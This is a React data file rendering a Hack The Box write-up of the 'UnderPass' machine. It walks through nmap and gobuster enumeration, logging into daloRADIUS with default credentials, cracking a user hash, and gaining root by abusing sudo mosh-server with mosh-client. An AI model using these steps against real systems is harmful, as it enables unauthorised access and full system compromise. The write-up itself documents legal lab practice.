// ✅ src/data/writeups/underpass.js
import React from "react";
import InjectedImage from "../../components/InjectedImage";

import UnderPassLogo from "../../assets/UnderPass.png";
import IMG1 from "../../assets/1underpassscreenshot.png";
import IMG2 from "../../assets/2underpassscreenshot.png";
import IMG3 from "../../assets/3underpassscreenshot.png";
import IMG4 from "../../assets/pwnedunderpass.png";

export const underpassWriteup = [
  () => (
    <>
      <h2>📈 Introduction</h2>
      <InjectedImage imgSrc={UnderPassLogo} alt="UnderPass Logo" />
      <p>
        In this write-up, I’ll walk you through my approach to solving the
        UnderPass machine from Hack The Box. UnderPass is a Linux machine rated
        as “Easy,” but it teaches several great lessons about service
        enumeration, web application analysis, and a very cool local privilege
        escalation vector.
      </p>
      <p>
        I’ll document what I did, what I learned, and how I eventually captured
        both the <code>user.txt</code> and <code>root.txt</code> flags.
      </p>
    </>
  ),

  () => (
    <>
      <h2>🔎 Enumeration</h2>
      <h3>🔗 Nmap Scan</h3>
      <p>
        The first step was to scan the target IP to identify open ports and
        services. I ran a full TCP port scan:
      </p>
      <pre>
        <code>nmap -sS -p- -sV -Pn 10.10.11.48</code>
      </pre>
      <pre>
        <code>
          22/tcp → OpenSSH 8.9p1
          {"\n"}80/tcp → Apache httpd 2.4.52
        </code>
      </pre>
      <p>
        At this point, no other TCP ports were visible to me (note: some users
        reported seeing additional UDP ports with -sU, but my scan did not
        reveal them).
      </p>
    </>
  ),

  () => (
    <>
      <h2>🌐 Web Enumeration</h2>
      <p>
        Visiting <code>http://underpass.htb</code>, I found an Apache default
        page.
      </p>
      <p>A deeper gobuster scan revealed the path:</p>
      <pre>
        <code>/daloradius/</code>
      </pre>
      <p>
        I did a quick Google search on “daloRadius”. daloRADIUS is a web
        management platform for FreeRADIUS servers.
      </p>
      <p>
        Navigating to: <br />
        <code>http://underpass.htb/daloradius/app/operators/login.php</code>
      </p>
    </>
  ),

  () => (
    <>
      <h2>🔑 Accessing daloRADIUS</h2>
      <p>
        A little research and testing of default credentials revealed that
        <code>administrator:radius</code> worked!
      </p>
      <InjectedImage imgSrc={IMG1} alt="daloRADIUS login" />
      <p>
        After logging in to the daloRADIUS panel, I clicked on the green Users
        box. Inside the Users list, I found a single user: <code>svcMosh</code>.
        Next to it was a hashed password:
      </p>
      <InjectedImage imgSrc={IMG2} alt="Found Hash" />

      <pre></pre>
      <p>
        I exported this hash and cracked it offline using hashcat, which
        revealed the password.
      </p>
      <p>With these credentials, I successfully SSH’d into the machine:</p>
      <pre>
        <code>ssh svcMosh@underpass.htb</code>
      </pre>
      <InjectedImage imgSrc={IMG3} alt="Logged in as svcMosh" />
    </>
  ),

  () => (
    <>
      <h2>🚀 Privilege Escalation</h2>
      <p>After gaining access as svcMosh, I checked for sudo permissions:</p>
      <pre>
        <code>sudo -l</code>
      </pre>
      <pre>
        <code>
          svcMosh@underpass:~$ sudo /usr/bin/mosh-server
          {"\n"}MOSH CONNECT 60001 3PSOzTOTbHfiPjxmVRxQog
          {"\n"}[mosh-server detached, pid = 1988]
        </code>
      </pre>

      <p>
        <strong>What is mosh-server?</strong>
        <br />
        mosh-server is part of the Mosh (mobile shell) package. It establishes
        an encrypted session between a client and server. When run as root, it
        spawns a privileged session and outputs a MOSH CONNECT line.
      </p>
      <h3>💥 Exploit Path</h3>
      <pre>
        <code>
          svcMosh@underpass:~$ sudo /usr/bin/mosh-server
          {"\n"}MOSH CONNECT 60001 3PSOzTOTbHfiPjxmVRxQog
          {"\n"}[mosh-server detached, pid = 1988]
          {"\n"}svcMosh@underpass:~$ MOSH_KEY=3PSOzTOTbHfiPjxmVRxQog mosh-client
          127.0.0.1 60001
        </code>
      </pre>
      <p>
        This spawned a new shell. Because mosh-server was running as root, I now
        had a root shell.
      </p>
      <InjectedImage imgSrc={IMG4} alt="Root shell" />
    </>
  ),

  () => (
    <>
      <h2>📜 Lessons Learned</h2>
      <p>The box combined:</p>
      <ul>
        <li>Basic service enumeration (SSH, HTTP)</li>
        <li>Classic default credential weakness in daloRADIUS</li>
        <li>Interesting local privesc via sudo mosh-server abuse</li>
      </ul>
      <p>
        A great example of chaining low-hanging fruit into full system
        compromise!
      </p>
      <h3>✅ Machine Completed: UnderPass</h3>
    </>
  ),
];
